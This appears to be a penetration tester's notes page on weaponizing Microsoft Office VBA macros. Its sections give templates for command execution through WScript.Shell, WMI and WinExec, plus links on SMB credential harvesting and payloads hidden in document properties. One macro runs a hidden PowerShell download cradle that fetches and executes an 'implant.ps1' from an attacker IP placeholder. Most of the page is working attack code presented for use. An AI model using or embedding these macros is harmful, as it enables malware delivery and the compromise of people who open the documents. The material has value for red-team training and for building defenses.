# Microsoft Office Macros

> [!INFO] Limited String Characters
> VBA Macro has a 50 characters string limit so you have to concatenate it. Use [[Macro Formatting Scripts|scripts]] to split the chunks.
## 01 - Command Execution

### Windows Script Host

Simple command execution via concatenation.

```vbscript
Sub Payload()
	Dim objShell As Object
	Set objShell = CreateObject("WScript.Shell")
    Dim Str As String
    
    Str = Str + ""

	' CreateObject("WScript.Shell").Run "<commands>", 1, True
    objShell.Run Str, 1, True
End Sub
```

VBA specific command execution.

```vbscript
Public Function Payload() As Variant
    Dim WindowScriptHost As Object
    Set WindowScriptHost = VBA.CreateObject("WScript.Shell")
    Dim waitOnReturn As Boolean: waitOnReturn = True
    Dim windowStyle As Integer: windowStyle = 7
    WindowScriptHost.Run "<commands>", windowStyle, waitOnReturn
End Function
```

Execute PowerShell one-liner.

```vbscript
Sub Payload()
	Dim objShell As Object
	Set objShell = CreateObject("WScript.Shell")

	objShell.Run "powershell.exe -Command ""IEX (New-Object Net.WebClient).DownloadString('http[s]://<IP>[:PORT]/implant.ps1')""", 0, True

End Sub
```

### Windows Management Instrument (WMI)

```vbscript
Sub WMI_Execution()
    Set Wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set Process = Wmi.Get("Win32_Process")
    Process.Create("<commands>")
End Sub
```

### WinAPI

```vb
Declare Function WinExec Lib "kernel32" ( _
     ByVal lpCmdLine As String, _
     ByVal nCmdShow As Long _
) As Long

Const SHOW_HIDE As Long = 0

Sub ExecuteFile()
     WinExec "C:\Windows\System32\notepad.exe", SHOW_HIDE
End Sub
```

## 02 - Payload Inside Document

TODO: Fill this info

Using **comments** in the **Properties** to include malware URL link to execute as shell via `rundll32.exe`

- [Malicious DLL Infection Through Metasploit SMB Exploit](https://www.drchaos.com/post/malicious-dll-infection-thru-metasploit-smb-exploit)

- [The Art of Creating backdoors and Exploits with Metasploit (Duplicate)](https://www.drchaos.com/post/the-art-of-creating-backdoors-and-exploits-with-metasploit)

- [Bank Security: MS Excel Weaponization Techniques](https://bank-security.medium.com/ms-excel-weaponization-techniques-79ac51610bf5)

## 03 - Harvest SMB Credentials

TODO: Demonstrate as many examples to fetch credentials using SMB relay via Responder

Refer to **Client-Side Attacks** subsection under [[02 - Responder|Responder]].

Refer to **Client-Side Attacks** subsection under [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xD - Client-Side Attacks/Authentication Relay/Metasploit|Metasploit]].

- [Securify: Living off the Land Stealing NetNTLM Hashes](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes/)

- [n00py: Phishing with Maldocs](https://www.n00py.io/2017/04/phishing-with-maldocs/)

## 04 - HTA

TODO: Fill this info

---
## References

### Backlinks

- [[Document Templates]]

### MalAPI

- [MalAPI: WinExec](https://malapi.io/winapi/WinExec)

### mgeeky

- [mgeeky: Backdooring Office Structures. Part 1: The Oldschool](https://mgeeky.tech/backdooring-office-structures-part-1-oldschool/)

- [mgeeky:  Backdooring Office Structures. Part 2: Payload Crumbs In Custom Parts ](https://mgeeky.tech/payload-crumbs-in-custom-parts/)

### Offensive Security

- [Offensive Security: Weaponizing and Abusing Hidden Functionalities Contained in Office Document Properties](https://www.offsec.com/blog/macro-weaponization/)

### Denwp

- [Denwp: From Base64 to Reverse Shell - Unpacking Malware from a Word Document](https://denwp.com/macro-word-document/)

### Sevagas

- [sevagas: Advanced_Initial_access_in_2024_OffensiveX](https://github.com/sevagas/Advanced_Initial_access_in_2024_OffensiveX/blob/main/breach_the_gates_extended.pdf)

### War Room

- [War Room: Metasploit Module of the Month Web Delivery](https://warroom.rsmus.com/metasploit-module-of-the-month-web_delivery/)

### nicholasmckinney

- [nicholasmckinney: Shellcode Execution Via HTA](https://gist.github.com/nicholasmckinney/e90e47e0545430656bdcca5544d6b4fc)